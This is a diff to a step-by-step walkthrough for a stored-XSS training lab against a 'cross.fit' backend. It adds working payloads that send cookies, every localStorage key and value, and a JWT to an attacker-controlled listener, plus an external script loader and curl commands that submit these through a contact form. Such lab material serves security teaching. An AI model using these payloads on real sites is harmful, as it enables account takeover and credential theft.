@@ -311,11 +311,34 @@ On the attacker machine, start a simple listener for `GET` requests:
 python3 -m http.server 8000
 ```
 
-### Step 9: enumerate `localStorage` from the worker browser
+### Step 9: try to steal the session cookie first
+
+The first quick probe is to try `document.cookie`, because that payload is short and fits comfortably in the public form.
+
+Payload:
+
+```html
+<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/collect?c='+encodeURIComponent(document.cookie)">
+```
+
+Same-host variation:
+
+```html
+<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/collect?c='+encodeURIComponent(document.cookie)">
+```
+
+Expected on the attacker machine:
+
+- one incoming `GET /collect`
+- the query may be empty or may not contain a useful session cookie
+
+With the current lab architecture, this is the signal that the interesting credential is probably not stored as a classic session cookie.
+
+### Step 10: prepare the `localStorage` scan
+
+The next step is to inspect `localStorage`. The obvious inline payload is:
 
 At this point you do not yet know how the internal credential is stored, so the realistic move is to enumerate browser storage first.
-
-Submit a payload that leaks every key and value present in `localStorage`:
 
 ```html
 <script>
@@ -347,12 +370,42 @@ for (let i = 0; i < localStorage.length; i += 1) {
 </script>
 ```
 
+That payload is too large for the current public form because the `message` field is limited to `250` characters.
+
+### Step 11: move the `localStorage` scan to an external JavaScript file
+
+Serve a helper file from the attacker machine instead.
+
+Start a static server from the repository root:
+
+```bash
+python3 -m http.server 8000
+```
+
+Served file:
+
+```text
+tools/payload-localstorage-scan.js
+```
+
+Minimal stored payload:
+
+```html
+<script src="http://attacker_machine_ip:8000/tools/payload-localstorage-scan.js"></script>
+```
+
+Same-host variation:
+
+```html
+<script src="http://docker_host_gateway_ip:8000/tools/payload-localstorage-scan.js"></script>
+```
+
 Expected on the attacker machine:
 
 - one or more incoming `GET /collect`
 - each request contains a `key=...` and `value=...`
 
-### Step 9.1: identify the JWT-shaped value
+### Step 11.1: identify the JWT-shaped value
 
 From those requests, look for a value with the usual JWT structure:
 
@@ -367,7 +420,7 @@ In this lab, that discovery should reveal:
 
 At that point you have justified, from observation, both the storage key and the fact that the privileged browser keeps a reusable credential accessible to JavaScript.
 
-### Step 10: confirm the JWT theft explicitly
+### Step 12: confirm the JWT theft explicitly
 
 Once you already know the key name, you can switch to a shorter payload that steals only that JWT:
 
@@ -388,7 +441,7 @@ Expected on the attacker machine:
 
 This proves that the internal backend is not only vulnerable to stored XSS, but also that its browser-held credential can be stolen and isolated.
 
-### Step 11: prepare a raw listener for the next exfiltration step
+### Step 13: prepare a raw listener for the next exfiltration step
 
 For the next step you want to receive a `POST` body manually, without using the bundled collector yet.
 
@@ -410,7 +463,7 @@ Expected:
 - when the XSS fires, you will see the full HTTP request
 - the request body will contain the Base64-encoded HTML
 
-### Step 12: exfiltrate the front page of `backend.cross.fit`
+### Step 14: exfiltrate the front page of `backend.cross.fit`
 
 Now use the XSS to request `/` from the same origin and send the returned HTML to the attacker listener.
 
@@ -465,7 +518,7 @@ Why the rest of the parameters make sense:
 - `mode: 'no-cors'` is enough because the attacker only needs the browser to send the request
 - `Content-Type: 'text/plain'` keeps the body easy to inspect by hand
 
-### Step 12.1: use an external JavaScript file if the message field is too small
+### Step 14.1: use an external JavaScript file if the message field is too small
 
 If the inline payload is too long for the `message` field, serve the external helper already included in the repo.
 
@@ -506,7 +559,7 @@ If you need another port or path for the receiver, you can pass it in the script
 <script src="http://attacker_machine_ip:8000/tools/payload-frontpage-login.js?collectPort=9000&collectPath=/internal-html"></script>
 ```
 
-### Step 13: wait for the worker and inspect the raw HTTP request
+### Step 15: wait for the worker and inspect the raw HTTP request
 
 As before, the worker will render the stored message from `/admin/messages/next`.
 
@@ -517,7 +570,7 @@ Expected in the attacker terminal:
 - a blank line
 - the raw Base64 body at the end of the request
 
-### Step 14: decode the Base64 manually and save it as HTML
+### Step 16: decode the Base64 manually and save it as HTML
 
 Copy only the request body, that is, the Base64 content after the blank line, and decode it:
 
@@ -537,7 +590,7 @@ Or inspect it directly:
 rg -n "<title>|<form|username|password" backend-frontpage.html
 ```
 
-### Step 15: validate the expected result
+### Step 17: validate the expected result
 
 The decoded HTML should correspond to the login page of `backend.cross.fit`.
 
@@ -554,7 +607,7 @@ At this stage, you have demonstrated three concrete things:
 - the privileged browser stores a reusable JWT accessible to JavaScript
 - a plain request to `/` still lands on login unless the attacker explicitly reuses that JWT
 
-### Step 16: move to the scripted collector later
+### Step 18: move to the scripted collector later
 
 Once this manual capture is understood and demonstrated, you can switch to:
 
@@ -598,9 +651,30 @@ Expected on the attacker machine with `python3 -m http.server 8000`:
 
 The `404` is fine. What matters is that the request reached the attacker-controlled server.
 
+### Cookie theft probe
+
+Use this short payload first if you want to check whether the privileged browser exposes a useful session cookie:
+
+```html
+<img src=x onerror="new Image().src='http://attacker_machine_ip:9000/collect?c='+encodeURIComponent(document.cookie)">
+```
+
+Same-host validation shortcut:
+
+```html
+<img src=x onerror="new Image().src='http://docker_host_gateway_ip:9000/collect?c='+encodeURIComponent(document.cookie)">
+```
+
+Expected in the current JWT-based lab:
+
+- `collector.py` receives `GET /collect`
+- `c=` may be empty or may not contain a reusable session credential
+
 ### `localStorage` enumeration from the privileged browser
 
-Use this first if you want to discover how the privileged browser stores reusable state:
+Use this next if the cookie probe was not enough and you want to discover how the privileged browser stores reusable state.
+
+The full inline version is:
 
 ```html
 <script>
@@ -630,6 +704,28 @@ for (let i = 0; i < localStorage.length; i += 1) {
     encodeURIComponent(value);
 }
 </script>
+```
+
+That inline payload is too large for the public `message` field once it is limited to `250` characters, so in practice you should load it from an external file.
+
+### `localStorage` enumeration via external JavaScript
+
+Serve:
+
+```text
+tools/payload-localstorage-scan.js
+```
+
+and submit:
+
+```html
+<script src="http://attacker_machine_ip:8000/tools/payload-localstorage-scan.js"></script>
+```
+
+Same-host validation shortcut:
+
+```html
+<script src="http://docker_host_gateway_ip:8000/tools/payload-localstorage-scan.js"></script>
 ```
 
 Expected in vulnerable mode:
@@ -797,12 +893,26 @@ curl -i -X POST http://cross.fit/contact \
 
 ### `localStorage` enumeration payload
 
+This is the inline version shown for reference, but it does not fit in the current `250` character `message` field.
+
 ```bash
 curl -i -X POST http://cross.fit/contact \
   -d "full_name=Alumno XSS Storage" \
   -d "email=xss-storage@example.com" \
   -d "phone=099000000" \
   --data-urlencode "message=<script>for (let i = 0; i < localStorage.length; i += 1) { const key = localStorage.key(i); const value = localStorage.getItem(key) || ''; new Image().src='http://attacker_machine_ip:9000/collect?key='+encodeURIComponent(key)+'&value='+encodeURIComponent(value); }</script>"
+```
+
+### `localStorage` external loader payload
+
+Use this one through the public form:
+
+```bash
+curl -i -X POST http://cross.fit/contact \
+  -d "full_name=Alumno XSS Storage JS" \
+  -d "email=xss-storage-js@example.com" \
+  -d "phone=099000000" \
+  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-localstorage-scan.js\"></script>"
 ```
 
 ### JWT theft payload
